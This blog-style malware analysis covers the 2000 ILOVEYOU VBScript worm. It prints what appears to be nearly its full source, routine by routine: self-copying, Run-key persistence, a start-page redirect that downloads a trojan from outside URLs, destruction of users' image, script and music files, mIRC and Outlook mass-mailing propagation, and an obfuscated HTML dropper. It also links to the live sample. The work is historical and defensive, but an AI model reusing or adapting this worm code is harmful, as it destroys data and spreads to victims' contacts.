---
title : iloveyou Virus
author : k4n3ki
date : 2023-07-29 1:00:00 -500
categories: [VBScript]
tags: [e-mail, Social Engineering]
---

## <span style="color:red">ILOVEYOU Virus</span>

<img src="/assets/img/iloveyou/love.avif">


In <span style="color:lightgreen">2000</span>, the world witnessed one of the most notorious and devastating cyberattacks known as the ILOVEYOU virus. Operating under the disguise of a harmless love letter, this malicious worm managed to wreak havoc on a global scale. Disguised with the subject line "ILOVEYOU" and a seemingly innocent message inviting recipients to check an attached love letter named <span style="color:red">LOVE-LETTER-FOR-YOU.txt.vbs</span>, the virus quickly exploited <span style="color:lightgreen">Microsoft Outlook's</span> widespread usage as the default email management application in corporate networks worldwide. Once the unsuspecting victims opened the attachment, the worm swiftly replicated itself and sent copies to every contact in their address book, creating a self-perpetuating chain reaction. 

<img src="/assets/img/iloveyou/email.png">

Its lightning-fast spread affected an estimated <span style="color:lightgreen">45 million users</span> in just ten days, causing an estimated <span style="color:lightgreen">$10 billion</span> in damages and bringing major enterprises and government organizations to their knees as they struggled to contain and mitigate its destructive consequences. The ILOVEYOU virus, also known as the <span style="color:lightgreen">"love letter virus"</span> and the <span style="color:lightgreen">"love bug worm,"</span> served as a stark reminder of the potential dangers posed by such sophisticated and stealthy cyber threats.


## Analysis

You can download the Sample from [VirusShare](https://virusshare.com/file?aa54181c8592c0fc9a110bc22c7685cdf2052e9eaedf2632c35214e7516d8266) and view the Virustotal report from [here](https://www.virustotal.com/gui/file/aa54181c8592c0fc9a110bc22c7685cdf2052e9eaedf2632c35214e7516d8266/detection). On Virustotal, out of 46, 41 vendors reported it malicious.


You can see the script running and its effect in the below video, click on the picture to move to youtube.

[![utube video](https://img.youtube.com/vi/ZqkFfF5kAvw/hqdefault.jpg)](https://www.youtube.com/watch?v=ZqkFfF5kAvw)

Open the script in any text editor like Notepad++. It first creates a object using CreateObject with argument "Scritping.FileSystemObject" which provides access to a computer's file system. Then it uses OpenTextFile to open the currently running VBScript file in read mode. It reads the entire content of the file using Read.all. Then it calls main function.

```vbs
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
```

> It uses "On Error Resume Next" in every function and subroutine.

Let's analyse functions and subroutines one by one.

### main

```vbs
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
```

In main function, it first checks the <span style="color:lightgreen">HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout</span>. If it is greater than 1, then it disables it. By setting it to 0, the script effectively disables the timeout, allowing the script to run indefinitely without being terminated by the Windows Script Host. Then it retrieves that path to Windows, System and Temp directory. Then It copies the script file to 3 locations.

- C:\Windows\System32\MSKernel32.vbs
- C:\Windows\Win32DLL.vbs
- C:\Windows\System32\LOVE-LETTER-FOR-YOU.TXT.vbs

Then it calls other functions and subroutines.

### regruns

```vbs
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
```

In regruns subroutine, it calls regcreate to create registeries under <span style="color:lightgreen">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32</span> and <span style="color:lightgreen">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL</span> and the values being the files copied in the main function <span style="color:lightgreen">MSKernel32.vbs</span> and <span style="color:lightgreen">Win32DLL.vbs</span>. Then it retrieves the download directory into the variable downread via the registry <span style="color:lightgreen">HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download</span> Directory value. If downread is empty, it sets it to "C:\".

Then it checks for a file named <span style="color:lightgreen">WinFAT32.exe</span> in system directory, if it exists then it generates a random number. According to the number generated, it sets changes the value of start page of Internet Explorer via te registry "<span style="color:lightgreen">HKCU\Software\Microsoft\Internet Explorer\Main\Start Page</span>". Then it checks for a file named <span style="color:lightgreen">WIN-BUGSFIX</span>.exe in downread directory. If doesn't exists then it creates two registry entries.

<img src="/assets/img/iloveyou/startpage.png">

- HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX : downread&"\WIN-BUGSFIX.exe -> to run the executable at system startup
- HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page : about:blank -> to display browser's start page blank


### listadriv

```vbs
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
```

This subroutine iteratees over all the <span style="color:lightgreen">drives</span> present in the system and checks there DriveType. If the drive type is 2(Fixed) or 3(Network) then it retrives the list of folders in the drive.

### infectfiles

```vbs
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
```

This subroutine gets a name of folder and then it retrieves the list of files in it. It stores the lowercase extension and name of file in ext and s variable respectively. Then it checks for there extensions and performs specifics tasks.

- vbs, vbe -> writes the vbscopy script which contains itself
- js, jse, css, wsh, sct, hta -> It copies the script and changes the extension to vbs
- jpg, jpeg -> It copies the script and changes the extension to vbs
- mp3, mp2 -> it just changes the extension to vbs

Then it adds a hidden attribute to the file. It compares the folderspec to eq which was initialized to "" in the starting. If they are not equal then it compares the folderspec with some names(<span style="color:lightgreen">mirc32.exe, mlink32.exe, mirc.ini, script.ini, mirc.hlp</span>), if there is a match, then it creates a <span style="color:lightgreen">script.ini</span> file and writes some mIRC script to it. At last it updates the eq value with the folderspec.

It repeats this procedure with every file in the folder.

### folderlist

```vbs
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
```

Basically it calls infectfiles for each subfolder present in folderspec.

### regcreate

```vbs
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
```

It's a type of shortcut to create a new registry entry with a specific key and value.

### regget

```vbs
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
```

It is designed to retrieve data from the Windows registry based on the provided registry key path.

### fileexist

```vbs
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
```

It checks for the existence of a file specified by the filespec parameter. It return 0 if the file exists otherwise 1.

### folderexist

```vbs
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
```

It checks for the existence of a folder specified by the folderspec parameter. It return 0 if the folder exists otherwise 1.

### spreadtoemail

```vbs
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
```

This code has setup an tracking system to send emails to contacts in the user's address book through Microsoft Outlook. It keeps the track through a registry path <span style="color:lightgreen">HKEY_CURRENT_USER\Software\Microsoft\WAB\</span> and add the email to it, who have recieved emails. It frames a mail.

- Subject : ILOVEYOU
- Body : knidly check the attached LOVELETTER coming from me.
- Attactment : C:\Windows\System32\Love-LETTER-FOR-YOU.TXT.vbs

### html

```vbs
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
```

This code generates a <span style="color:lightgreen">HTML</span> file named <span style="color:lightgreen">LOVE-LETTER-FOR-YOU.HTM</span> with some Javascript and VBScript code included. The HTML seems to be obfuscated and frames it dynamically by replacing characters. 

### Protection 

To protect against viruses like ILOVEYOU, users should prioritize installing reliable <span style="color:lightgreen">antivirus</span> software to regularly scan their systems for potential threats. Additionally, it is crucial to exercise caution when sharing email addresses online, especially on unsecured websites or suspicious platforms. Emails from unknown sources should never be opened, as they may contain harmful attachments or links that could compromise the system's security. If users receive <span style="color:lightgreen">suspicious emails</span>, it is best to refrain from interacting with them and immediately delete them to avoid any potential risk to their computer and personal data. Staying vigilant and informed about cybersecurity practices is essential in safeguarding against virus attacks and maintaining a secure digital environment.